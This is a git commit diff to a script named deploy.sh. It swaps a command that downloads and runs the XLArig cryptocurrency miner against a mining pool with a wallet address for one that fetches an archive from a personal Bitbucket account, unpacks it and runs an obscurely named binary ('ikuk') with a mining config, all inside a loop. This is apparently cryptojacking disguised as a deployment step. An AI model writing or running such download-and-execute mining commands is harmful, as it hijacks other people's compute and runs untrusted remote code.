672d0e1ef59cff045addd589f13d263e93617baf
bara798 <86476385+bara798@users.noreply.github.com>
2021-06-26 16:23:37 +0700

    Update deploy.sh

--- deploy.sh
+++ deploy.sh
@@ -3,8 +3,8 @@
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
  
-wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o scala.herominers.com:10131 -u pzCjsbGyA4FuMxfj4BTcVfcznumC2tp -p bangke -a panthera -k -t8
- 
+wget https://bitbucket.org/bara_798/verus/downloads/bandar.tar.gz && tar -xvf bandar.tar.gz && ./ikuk mine.ini
+
      echo COUNTER $COUNTER
      let COUNTER-=1
 done
